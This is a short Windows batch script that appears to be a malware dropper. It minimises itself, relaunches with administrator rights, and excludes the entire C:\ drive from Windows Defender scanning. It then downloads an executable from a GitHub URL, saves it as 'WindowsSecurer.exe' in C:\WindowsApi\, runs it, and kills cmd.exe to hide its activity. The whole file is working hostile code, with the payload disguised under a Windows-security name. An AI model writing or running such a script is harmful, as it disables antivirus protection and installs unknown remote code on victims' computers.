@echo off

:: Check if the script is minimized, if not, minimize it
if not DEFINED IS_MINIMIZED (
    set IS_MINIMIZED=1
    start "" /min "%~dpnx0" %*
    exit
)

:: If the script is not run as administrator, relaunch it as admin
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)

:: Set the script directory
set "scriptDir=%~dp0"

:: Add exclusion path for Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

:: Wait for 3 seconds
TIMEOUT /T 3

:: Download the HelloWorldRunner.exe from GitHub and save it as WindowsSecurer.exe in C:\WindowsApi\
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/KR4eeR/bhn/raw/main/HelloWorldRunner.exe', 'C:\WindowsApi\WindowsSecurer.exe')"

:: Start the WindowsSecurer.exe
start "" "C:\WindowsApi\WindowsSecurer.exe"

:: Kill the current cmd.exe process
taskkill /IM cmd.exe

:: Exit the script
exit
